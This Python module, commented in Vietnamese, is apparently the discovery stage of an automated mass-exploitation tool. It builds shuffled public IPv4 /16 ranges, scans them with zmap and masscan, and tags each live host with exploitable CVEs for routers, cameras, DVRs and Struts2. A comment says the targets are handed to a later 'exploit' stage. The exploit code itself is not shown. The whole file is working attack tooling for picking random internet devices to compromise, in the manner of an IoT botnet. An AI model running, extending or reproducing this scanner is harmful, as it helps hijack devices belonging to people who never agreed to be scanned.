"""
Giai đoạn 0: Discovery — sinh danh sách IP live + cổng mở từ SCAN_PORTS.

Engine chọn bằng CLI --engines (hoặc config.DISCOVER_ENGINE), mặc định "zmap":

  * zmap (hybrid): zmap quét ZMAP_DISCOVERY_PORTS (mặc định cổng 80) để phát
    hiện host số trong dải /16 → ghi live_hosts.txt (1 IP/dòng) → gửi qua
    masscan (-iL) để quét SCAN_PORTS tìm cổng mở. masscan thiếu/thất bại →
    fallback về zmap-per-port (luồng cũ).
  * masscan: quét SCAN_PORTS trực tiếp trên toàn dải (không cần bước phát hiện
    host riêng). masscan thiếu/thất bại → fallback zmap-per-port.

Luồng xử lý chung:
    check_zmap() → zmap_scan(port)/masscan_scan() → dedupe_and_merge()
    → exclude_private_ips() + load_blacklist() → {ip: [cổng mở, cve_ứng_viên]}

Output cuối cùng là dict:
    { "1.2.3.4": {"ports": [80, 8080], "cves": ["CVE-2023-1389", ...]}, ... }
"""

import ipaddress
import json
import logging
import os
import random
import shutil
import subprocess
import time

from config import (
    ALLOW_PRIVATE,
    AUTO_GEN_CIDR,
    AUTO_GEN_MAX_CHUNKS,
    AUTO_GEN_SEED,
    AUTO_GEN_SHUFFLE,
    AUTO_GEN_SPLIT_TO,
    BLACKLIST_FILE,
    DISCOVER_ENGINE,
    MASSCAN_RATE,
    MAX_TARGETS,
    RANGES_CACHE_FILE,
    SCAN_PORTS,
    SCAN_RANGES,
    ZMAP_BANDWIDTH,
    ZMAP_DISCOVERY_PORTS,
    ZMAP_HOSTS_FILE,
    ZMAP_INTERFACE,
    ZMAP_RAW_DIR,
)

log = logging.getLogger("sofia.target_generator")

# ── Engine discovery đang dùng (--engines / config.DISCOVER_ENGINE) ───────
ENGINE = DISCOVER_ENGINE   # "zmap" | "masscan"


def set_engine(name=None):
    """CLI --engines ghi đè engine discovery; name=None chỉ log engine hiện tại."""
    global ENGINE
    if name:
        if name not in ("zmap", "masscan"):
            raise ValueError("engine không hợp lệ: %r (chỉ chấp nhận zmap/masscan)" % name)
        ENGINE = name
    log.info("Discovery engine: %s", ENGINE)
    return ENGINE

# ── Map cổng → danh sách CVE thuộc cổng đó ──────────────────────────────
PORT_CVE_MAP = {
    37215: ["CVE-2017-17215"],                                   # Huawei HG532
    80: [
        "CVE-2021-36260",   # Hikvision
        "CVE-2023-1389",    # TP-Link AX21
        "CVE-2024-3721",    # TBK DVR
        "CVE-2024-45414",   # ZTE
        "CVE-2023-33538",   # TP-Link EOL
        "CVE-2025-29635",   # D-Link 823X
        "CVE-2023-25280",   # D-Link 820L
        "CVE-2023-27240",   # Tenda AX3
        "CVE-2022-30023",   # Tenda HG9
        "CVE-2021-46422",   # Telesquare
        "CVE-2019-17621",   # DIR-859
        "CVE-2020-8515",    # DrayTek keyPath
        "CVE-2025-34043",   # Vacron NVR
        "CVE-2025-1316",    # Edimax
        "CVE-2017-5638",    # Struts2
    ],
    8080: [
        "CVE-2017-5638",    # Struts2 (web app thường chạy 8080)
        "CVE-2023-1389",    # TP-Link AX21
        "CVE-2021-36260",   # Hikvision
        "CVE-2024-45414",   # ZTE
    ],
    8443: ["CVE-2018-9866"],            # SonicWall GMS (XML-RPC)
    21009: ["CVE-2018-9866"],           # Cổng XML-RPC thực tế của GMS service
    443: [                                # Web IoT qua HTTPS
        "CVE-2021-36260",   # Hikvision (HTTPS)
        "CVE-2023-1389",    # TP-Link
        "CVE-2024-45414",   # ZTE
    ],
    7547: ["CVE-2017-17215"],           # TR-069 — Huawei HG532 hay chạy ở đây
}


def build_port_map():
    """Map cổng → danh sách CVE thuộc cổng đó."""
    return {port: list(cves) for port, cves in PORT_CVE_MAP.items()}


# ── Auto-generate dải IPv4 /16 (nâng cấp: zmap tự sinh dải thay vì khai tay) ──
def _range_is_ok(cidr):
    """Dải hợp lệ để quét: IPv4, không private/reserved (trừ ALLOW_PRIVATE),
    không nằm trong blacklist."""
    try:
        net = ipaddress.ip_network(cidr, strict=False)
    except ValueError:
        return False
    if net.version != 4:
        return False
    if not ALLOW_PRIVATE and _is_private(net.network_address):
        return False
    for bl in load_blacklist():
        if bl.version != 4:
            continue                    # zmap chỉ quét IPv4 — bỏ dòng IPv6 trong blacklist
        if net.subnet_of(bl) or bl.subnet_of(net):
            return False
    return True


def generate_ipv4_ranges(cidr=AUTO_GEN_CIDR, split_to=AUTO_GEN_SPLIT_TO,
                         shuffle=AUTO_GEN_SHUFFLE, seed=AUTO_GEN_SEED,
                         max_chunks=AUTO_GEN_MAX_CHUNKS,
                         use_cache=True, force=False):
    """
    TỰ ĐỘNG SINH danh sách dải IPv4 /16 để zmap/masscan quét.

    Chia `cidr` thành các chunk /`split_to` (mặc định /16 → 65536 IP/dải),
    lọc private/RFC1918 + blacklist, xáo thứ tự theo `seed`, giới hạn
    `max_chunks`. Danh sách được cache vào RANGES_CACHE_FILE để:
      * resume ổn định (chạy lại → cùng thứ tự dải, không trùng lặp)
      * `--max-chunks` chỉ ảnh hưởng lần tạo đầu; các lần sau đọc cache.

    Trả về list CIDR str (VD ["203.0.113.0/16", ...]).
    """
    os.makedirs(ZMAP_RAW_DIR, exist_ok=True)
    cache_key = {"cidr": cidr, "split_to": split_to, "shuffle": shuffle,
                 "seed": seed, "max_chunks": max_chunks}

    if use_cache and not force and os.path.isfile(RANGES_CACHE_FILE):
        try:
            with open(RANGES_CACHE_FILE, encoding="utf-8") as fh:
                cached = json.load(fh)
            if cached.get("key") == cache_key and isinstance(cached.get("ranges"), list):
                log.info("Dải /%d đọc từ cache (%d dải): %s",
                         split_to, len(cached["ranges"]), RANGES_CACHE_FILE)
                return list(cached["ranges"])
        except (ValueError, OSError) as exc:
            log.warning("Cache dải đọc lỗi (%r) — sinh lại", exc)

    try:
        net = ipaddress.ip_network(cidr, strict=False)
    except ValueError as exc:
        log.error("AUTO_GEN_CIDR không hợp lệ %r: %s", cidr, exc)
        return []
    if net.version != 4:
        log.error("AUTO_GEN_CIDR phải là IPv4: %s", cidr)
        return []
    split = int(split_to)
    if split < net.prefixlen:
        split = net.prefixlen          # không chia nhỏ hơn dải gốc
    try:
        subnets = list(net.subnets(new_prefix=split))
    except ValueError:
        subnets = [net]

    # Lọc private/RFC1918 + blacklist (trừ khi ALLOW_PRIVATE bật)
    chunks = [str(s) for s in subnets if _range_is_ok(str(s))]
    dropped = len(subnets) - len(chunks)
    if dropped:
        log.info("Đã lọc %d dải private/reserved/blacklist khỏi %d dải sinh ra",
                 dropped, len(subnets))

    # Xáo thứ tự (seed > 0 → tái lập được)
    if shuffle:
        rng = random.Random(int(seed) if int(seed) > 0 else None)
        rng.shuffle(chunks)

    limit = int(max_chunks or 0)
    if limit > 0 and len(chunks) > limit:
        chunks = chunks[:limit]

    try:
        with open(RANGES_CACHE_FILE, "w", encoding="utf-8") as fh:
            json.dump({"key": cache_key, "ranges": chunks}, fh, indent=2)
        log.info("Cache dải /%d → %s (%d dải)", split, RANGES_CACHE_FILE, len(chunks))
    except OSError as exc:
        log.warning("Không ghi được cache dải (%r)", exc)

    log.info("[ipgen] %s → %d chunk /%d (sau lọc + giới hạn) "
             "— shuffle=%s seed=%d max_chunks=%d",
             cidr, len(chunks), split, shuffle, int(seed), limit)
    return chunks


def check_zmap():
    """Kiểm tra zmap/masscan đã cài chưa (shutil.which)."""
    zmap = shutil.which("zmap")
    masscan = shutil.which("masscan")
    if not (zmap or masscan):
        log.warning("Không tìm thấy zmap lẫn masscan trong PATH. "
                    "Cài đặt: apt install zmap  /  apt install masscan")
    return {"zmap": zmap, "masscan": masscan}


def load_blacklist():
    """Đọc file loại trừ (CIDR, 1 dòng 1 dải, '#' = comment)."""
    networks = []
    if os.path.isfile(BLACKLIST_FILE):
        with open(BLACKLIST_FILE, "r", encoding="utf-8") as fh:
            for raw in fh:
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                try:
                    networks.append(ipaddress.ip_network(line, strict=False))
                except ValueError as exc:
                    log.warning("Dòng blacklist không hợp lệ '%s': %s", line, exc)
    return networks


def _is_private(ip_obj):
    """RFC1918 / loopback / link-local / multicast / reserved."""
    return (ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local
            or ip_obj.is_multicast or ip_obj.is_reserved
            or ip_obj.is_unspecified)


def exclude_private_ips(ip_set):
    """Lọc RFC1918/loopback/link-local (bỏ qua nếu ALLOW_PRIVATE=True)."""
    if ALLOW_PRIVATE:
        return ip_set
    kept = {ip for ip in ip_set if not _is_private(ipaddress.ip_address(ip))}
    dropped = len(ip_set) - len(kept)
    if dropped:
        log.info("Đã lọc %d IP nội bộ/không hợp lệ (ALLOW_PRIVATE=%s)",
                 dropped, ALLOW_PRIVATE)
    return kept


def _sanitize_blacklist_for_zmap(blacklist_file):
    """zmap bản hiện tại không đọc được dòng IPv6 trong blacklist
    (lỗi `constraint: '128' is not a valid prefix length`).
    Tạo bản chỉ chứa dòng IPv4 + comment, ghi vào ZMAP_RAW_DIR, trả về path.
    """
    lines = []
    if blacklist_file and os.path.isfile(blacklist_file):
        with open(blacklist_file, encoding="utf-8") as fh:
            for raw in fh:
                line = raw.strip()
                if not line or line.startswith("#"):
                    lines.append(line)
                    continue
                try:
                    if ipaddress.ip_network(line, strict=False).version == 4:
                        lines.append(line)
                    # dòng IPv6 bị bỏ qua — zmap chỉ quét IPv4
                except ValueError:
                    lines.append(line)
    path = os.path.join(ZMAP_RAW_DIR, "blacklist_v4_tmp.conf")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")
    return path


def zmap_scan(port, bandwidth=ZMAP_BANDWIDTH, blacklist_file=BLACKLIST_FILE,
              out_file=None, timeout=600, subnets=None):
    """
    Chạy zmap -p <port> -B <bw> <subnets> -o <file>. Trả về đường dẫn file kết quả
    (None nếu thất bại). Mỗi dòng trong file là một IP.
    subnets: list CIDR (VD ["192.0.2.0/24"]) — bắt buộc; zmap tự sinh danh sách
    IPv4 trong các dải này. Thiếu dải → không quét (fail-closed).
    """
    if subnets is None:
        subnets = SCAN_RANGES
    if not subnets:
        log.error("zmap cổng %d: chưa khai báo dải quét (SCAN_RANGES / --scan-range) — bỏ qua", port)
        return None
    tools = check_zmap()
    if not tools["zmap"]:
        log.error("zmap chưa được cài — không thể quét cổng %d", port)
        return None

    os.makedirs(ZMAP_RAW_DIR, exist_ok=True)
    out_file = out_file or os.path.join(ZMAP_RAW_DIR, f"port_{port}.txt")
    cmd = [tools["zmap"], "-p", str(port), "-B", bandwidth, "-o", out_file]
    if blacklist_file and os.path.isfile(blacklist_file):
        blacklist_file = _sanitize_blacklist_for_zmap(blacklist_file)
        cmd += ["--blacklist-file", blacklist_file]
    if ZMAP_INTERFACE:
        cmd += ["-i", ZMAP_INTERFACE]
    cmd += list(subnets)   # zmap tự sinh IPv4 trong các dải này

    log.info("zmap: %s", " ".join(cmd))
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        log.error("zmap cổng %d hết thời gian (%ds)", port, timeout)
        return None

    if proc.returncode != 0:
        log.error("zmap cổng %d thất bại (rc=%d): %s",
                  port, proc.returncode, proc.stderr.strip()[:500])
        return None

    count = 0
    if os.path.isfile(out_file):
        with open(out_file, "r", encoding="utf-8") as fh:
            count = sum(1 for _ in fh)
    log.info("zmap cổng %d xong: %d IP", port, count)
    return out_file


def masscan_scan(ports, rate=MASSCAN_RATE, out_file=None, timeout=600,
                 subnets=None, include_file=None):
    """
    masscan quét nhiều cổng 1 lần, output dạng list:  open tcp 80 1.2.3.4 ...

    subnets      : list CIDR → thêm --range cho từng dải (quét toàn dải).
    include_file : file 1 IP/dòng → thêm -iL (luồng hybrid: masscan chỉ quét
                   cổng trên host mà zmap đã xác nhận sống — nhanh hơn nhiều).

    Nếu include_file hợp lệ → ưu tiên dùng; subnets chỉ là fallback.
    """
    if not include_file and subnets is None:
        subnets = SCAN_RANGES
    if not include_file and not subnets:
        log.error("masscan: chưa khai dải quét (SCAN_RANGES) hoặc file -iL — bỏ qua")
        return None
    tools = check_zmap()
    if not tools["masscan"]:
        log.error("masscan chưa được cài")
        return None

    os.makedirs(ZMAP_RAW_DIR, exist_ok=True)
    out_file = out_file or os.path.join(ZMAP_RAW_DIR, "masscan_all.txt")
    cmd = [tools["masscan"], "-p", ",".join(str(p) for p in ports),
           "--rate", str(rate), "-oL", out_file]
    if include_file and os.path.isfile(include_file):
        cmd += ["-iL", include_file]
    else:
        for subnet in subnets:
            cmd += ["--range", subnet]
    if os.path.isfile(BLACKLIST_FILE):
        cmd += ["--excludefile", BLACKLIST_FILE]

    log.info("masscan: %s", " ".join(cmd))
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired:
        log.error("masscan hết thời gian (%ds)", timeout)
        return None
    if proc.returncode != 0:
        log.error("masscan thất bại (rc=%d): %s",
                  proc.returncode, proc.stderr.strip()[:500])
        return None
    log.info("masscan xong: %s", out_file)
    return out_file


def _read_ips(path):
    """Đọc file zmap (1 IP/dòng) hoặc masscan (-oL: 'open tcp 80 ip ...')."""
    ips = set()
    if not path or not os.path.isfile(path):
        return ips
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if line.startswith("open "):            # masscan list format
                parts = line.split()
                if len(parts) >= 4 and parts[0] == "open":
                    ips.add(parts[3])
            else:                                   # zmap raw format
                ips.add(line)
    return ips


def _read_open_ports(path):
    """masscan -oL → {ip: set(port)} — parse cổng chính xác từ dòng 'open tcp <p> <ip>'."""
    out = {}
    if not path or not os.path.isfile(path):
        return out
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            line = line.strip()
            if not line.startswith("open "):
                continue
            parts = line.split()
            if len(parts) >= 4 and parts[0] == "open":
                try:
                    out.setdefault(parts[3], set()).add(int(parts[2]))
                except ValueError:
                    pass
    return out


def dedupe_and_merge(port_ips):
    """
    Gộp kết quả các cổng → {ip: [cổng mở]}.
    port_ips: {port: set(ips)}
    """
    merged = {}
    for port, ips in port_ips.items():
        for ip in ips:
            merged.setdefault(ip, []).append(port)
    for ip in merged:
        merged[ip] = sorted(merged[ip])
    log.info("Gộp %d cổng → %d IP duy nhất", len(port_ips), len(merged))
    return merged


def _attach_cves(targets):
    """Gắn danh sách CVE ứng viên cho từng IP theo cổng mở."""
    out = {}
    for ip, ports in targets.items():
        cves = set()
        for port in ports:
            cves.update(PORT_CVE_MAP.get(port, []))
        out[ip] = {"ports": ports, "cves": sorted(cves)}
    return out


def _zmap_per_port():
    """Luồng cũ: zmap quét từng cổng trong SCAN_PORTS; masscan đơn cổng
    fallback khi zmap thiếu/thất bại. Dùng khi masscan không cài hoặc lỗi."""
    tools = check_zmap()
    port_ips = {port: set() for port in SCAN_PORTS}
    for port in SCAN_PORTS:
        path = zmap_scan(port) if tools["zmap"] else None
        if path is None and tools["masscan"]:
            log.info("Fallback: masscan cổng %d", port)
            path = masscan_scan([port])
        port_ips[port] |= _read_ips(path)
    return port_ips


def _zmap_hybrid():
    """Engine zmap (mặc định — hybrid):
      1) zmap quét ZMAP_DISCOVERY_PORTS (mặc định cổng 80) để PHÁT HIỆN host số
         trong dải /16 → ghi live_hosts.txt (1 IP/dòng).
      2) masscan -iL live_hosts.txt quét SCAN_PORTS → cổng MỞ trên từng host.
      3) Host số nhưng masscan không xác nhận cổng nào (filtered) → vẫn giữ IP
         ở đúng cổng discovery để stage 1 re-check (zmap đã xác nhận cổng đó mở).
      masscan thiếu/thất bại → fallback _zmap_per_port().
    """
    tools = check_zmap()
    if not tools["zmap"]:
        log.error("Engine zmap: chưa cài zmap — không thể phát hiện host")
        return None
    if not tools["masscan"]:
        log.warning("Engine zmap: chưa cài masscan — fallback zmap-per-port")
        return _zmap_per_port()

    # Bước 1: zmap phát hiện host số trên các cổng discovery
    live = set()
    for port in ZMAP_DISCOVERY_PORTS:
        path = zmap_scan(port)
        if path:
            live |= _read_ips(path)
    if not live:
        log.info("Hybrid: không phát hiện host số nào trên cổng %s — bỏ qua dải này",
                 ZMAP_DISCOVERY_PORTS)
        return None

    os.makedirs(ZMAP_RAW_DIR, exist_ok=True)
    with open(ZMAP_HOSTS_FILE, "w", encoding="utf-8") as fh:
        fh.write("\n".join(sorted(live)) + "\n")
    log.info("Hybrid: zmap phát hiện %d host số → %s", len(live), ZMAP_HOSTS_FILE)

    # Bước 2: masscan quét SCAN_PORTS trên các host đó (-iL)
    path = masscan_scan(SCAN_PORTS, include_file=ZMAP_HOSTS_FILE)
    if path is None:
        log.warning("Hybrid: masscan quét cổng thất bại — fallback zmap-per-port")
        return _zmap_per_port()

    port_ips = {port: set() for port in SCAN_PORTS}
    for ip, open_ports in _read_open_ports(path).items():
        for port in open_ports:
            if port in port_ips:
                port_ips[port].add(ip)
    # Bổ sung host từ bước 1 vào cổng discovery (đã được zmap xác nhận mở)
    for port in ZMAP_DISCOVERY_PORTS:
        if port in port_ips:
            port_ips[port] |= live
    return port_ips


def _masscan_only():
    """Engine masscan: quét SCAN_PORTS trực tiếp trên toàn dải /16
    (không cần bước phát hiện host riêng). masscan thiếu/thất bại →
    fallback _zmap_per_port()."""
    tools = check_zmap()
    if not tools["masscan"]:
        log.error("Engine masscan: chưa cài masscan — fallback zmap-per-port")
        return _zmap_per_port()
    path = masscan_scan(SCAN_PORTS)
    if path is None:
        log.warning("Engine masscan: quét thất bại — fallback zmap-per-port")
        return _zmap_per_port()
    port_ips = {port: set() for port in SCAN_PORTS}
    for ip, open_ports in _read_open_ports(path).items():
        for port in open_ports:
            if port in port_ips:
                port_ips[port].add(ip)
    return port_ips


def generate(engine=None):
    """
    Điều phối Giai đoạn 0 — engine chọn bởi --engines / config.DISCOVER_ENGINE:

      * "zmap" (mặc định — hybrid): zmap phát hiện host số → masscan -iL quét
        cổng mở trên các host đó (xem _zmap_hybrid).
      * "masscan": masscan quét SCAN_PORTS trực tiếp toàn dải (xem _masscan_only).

    engine=None → dùng ENGINE hiện tại (đã set bởi config hoặc set_engine()).
    Dải quét lấy từ SCAN_RANGES (config / --scan-range / batch /16). Trống = fail-closed.
    Gộp + lọc private/blacklist, giới hạn MAX_TARGETS.
    """
    if engine:
        set_engine(engine)
    if not SCAN_RANGES:
        log.warning("SCAN_RANGES trống — bỏ qua discovery (fail-closed). "
                    "Khai báo qua config.SCAN_RANGES hoặc --scan-range <CIDR>.")
        return {}
    os.makedirs(ZMAP_RAW_DIR, exist_ok=True)
    log.info("Bắt đầu discovery với engine: %s (dải %s)", ENGINE, ", ".join(SCAN_RANGES))

    port_ips = _zmap_hybrid() if ENGINE == "zmap" else _masscan_only()
    if not port_ips:
        log.info("Discovery (%s): không có IP nào — bỏ qua dải này", ENGINE)
        return {}

    merged = dedupe_and_merge(port_ips)
    merged = {ip: merged[ip] for ip in exclude_private_ips(set(merged))}
    targets = _attach_cves(merged)

    # Giới hạn số IP đưa vào exploit (an toàn)
    if len(targets) > MAX_TARGETS:
        log.warning("Số IP (%d) vượt MAX_TARGETS (%d) — giữ %d IP đầu tiên",
                    len(targets), MAX_TARGETS, MAX_TARGETS)
        targets = dict(sorted(targets.items())[:MAX_TARGETS])

    log.info("Discovery xong (%s): %d mục tiêu", ENGINE, len(targets))
    return targets













